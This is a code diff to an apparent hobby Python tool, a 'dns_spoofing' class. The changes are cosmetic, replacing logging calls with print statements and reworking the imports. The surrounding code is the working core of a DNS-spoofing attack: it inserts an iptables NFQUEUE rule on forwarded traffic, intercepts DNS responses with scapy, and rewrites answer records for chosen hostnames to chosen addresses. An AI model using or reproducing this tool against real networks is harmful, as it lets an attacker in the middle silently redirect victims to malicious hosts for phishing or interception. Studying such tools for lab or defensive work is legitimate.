@@ -1,8 +1,7 @@
-import logging as log
 import os
-from scapy import all
 from netfilterqueue import NetfilterQueue
-from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+from scapy.all import *
+from scapy.layers.dns import *
 
 
 class dns_spoofing:
@@ -15,7 +14,7 @@ class dns_spoofing:
         scapyPacket = IP(packet.get_payload())
         if scapyPacket.haslayer(DNSRR):
             try:
-                log.info(f'[original] {scapyPacket[DNSRR].summary()}')
+                print(f'[original] {scapyPacket[DNSRR].summary()}')
                 queryName = scapyPacket[DNSQR].qname
                 if queryName in self.hostDict:
                     scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
@@ -24,23 +23,23 @@ class dns_spoofing:
                     del scapyPacket[IP].chksum
                     del scapyPacket[UDP].len
                     del scapyPacket[UDP].chksum
-                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
+                    print(f'[modified] {scapyPacket[DNSRR].summary()}')
                 else:
-                    log.info(f'[not modified] {scapyPacket[DNSRR].rdata}')
+                    print(f'[not modified] {scapyPacket[DNSRR].rdata}')
             except IndexError as error:
-                log.error(error)
+                print("Error: ", error)
             packet.set_payload(bytes(scapyPacket))
             return packet.accept()
 
     def __call__(self):
-        log.info("Snoofing….")
+        print("Start snoofing")
         os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
         self.queue.bind(self.queueNum, self.callBack)
         try:
             self.queue.run()
         except KeyboardInterrupt:
             os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-            log.info("[!] iptable rule flushed")
+            print("iptable rule flushed")
 
 
 if __name__ == '__main__':
